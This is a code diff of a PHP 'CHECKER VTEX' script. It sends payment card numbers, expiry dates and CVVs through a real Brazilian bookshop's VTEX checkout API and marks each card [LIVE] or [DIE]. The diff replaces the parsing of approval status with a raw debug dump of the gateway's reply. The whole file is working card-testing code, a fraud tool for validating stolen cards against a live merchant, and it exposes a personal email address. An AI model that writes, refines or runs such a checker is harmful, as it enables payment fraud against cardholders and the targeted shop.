@@ -1,6 +1,6 @@
 <?php
 // =====================================================
-// ✅ CHECKER VTEX - TRATAMENTO CORRETO DA RESPOSTA
+// ✅ CHECKER VTEX - DEBUG BRUTO DO RETORNO DO GATEWAY
 // =====================================================
 define('BASE_URL', 'https://loja.umlivro.com.br');
 define('EMAIL', 'danielvitordeoliveiraconceicao@gmail.com');
@@ -84,7 +84,7 @@ $valor_total = $json_cart['totalizers'][0]['value'] ?? 1000;
 
 if (!isset($json_cart['orderFormId'])) {
     @unlink($cookie_path);
-    echo "<span class='text-red-400 font-bold'>[DIE]</span> <span class='text-slate-400'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Retorno: Falha ao gerar sessão do carrinho</span>";
+    echo "<span class='text-red-400 font-bold'>[DIE]</span> <span class='text-slate-400'>Erro ao gerar sessão do carrinho</span>";
     exit;
 }
 
@@ -134,54 +134,8 @@ $payload_payment = [
 $resp_payment = vtex_request(BASE_URL . "/api/checkout/pub/orderForm/" . $order_form_id . "/attachments/paymentData", $payload_payment, ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
 @unlink($cookie_path);
 
-$json_final = json_decode($resp_payment, true);
+// Exibe a resposta bruta codificada para visualizarmos a estrutura real da VTEX
+$msg_detalhada = "DEBUG JSON: " . htmlspecialchars($resp_payment);
 
-$aprovado = false;
-$msg_detalhada = "";
-
-// Varredura profunda nas transações retornadas pelo paymentData
-if (isset($json_final['paymentData']['transactions']) && is_array($json_final['paymentData']['transactions'])) {
-    foreach ($json_final['paymentData']['transactions'] as $tx) {
-        if (isset($tx['payments']) && is_array($tx['payments'])) {
-            foreach ($tx['payments'] as $pay) {
-                $status = $pay['status'] ?? '';
-                
-                if ($status === 'approved' || $status === 'completed') {
-                    $aprovado = true;
-                }
-                
-                // Extrai mensagens específicas do conector se existirem
-                if (!empty($pay['connectorResponses']['message'])) {
-                    $msg_detalhada = $pay['connectorResponses']['message'];
-                } elseif (!empty($pay['connectorResponses']['acquirerResponseMessage'])) {
-                    $msg_detalhada = $pay['connectorResponses']['acquirerResponseMessage'];
-                } elseif (!empty($pay['processorResponseMessage'])) {
-                    $msg_detalhada = $pay['processorResponseMessage'];
-                } elseif (!empty($pay['lastMessage'])) {
-                    $msg_detalhada = $pay['lastMessage'];
-                }
-            }
-        }
-    }
-}
-
-// Verifica mensagens globais de erro do orderForm
-if (empty($msg_detalhada) && isset($json_final['messages']) && is_array($json_final['messages'])) {
-    foreach ($json_final['messages'] as $msg) {
-        if (!empty($msg['text'])) {
-            $msg_detalhada = $msg['text'];
-            break;
-        }
-    }
-}
-
-if (empty($msg_detalhada)) {
-    $msg_detalhada = "Transação recusada pelo gateway / adquirente";
-}
-
-if ($aprovado) {
-    echo "<span class='text-emerald-400 font-bold'>[LIVE]</span> <span class='text-slate-200'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Retorno: Transação Aprovada com Sucesso</span>";
-} else {
-    echo "<span class='text-red-400 font-bold'>[DIE]</span> <span class='text-slate-400'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Retorno: {$msg_detalhada}</span>";
-}
+echo "<span class='text-red-400 font-bold'>[DIE]</span> <span class='text-slate-400'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | CVV: {$cc_cvv} | Retorno: {$msg_detalhada}</span>";
 ?>
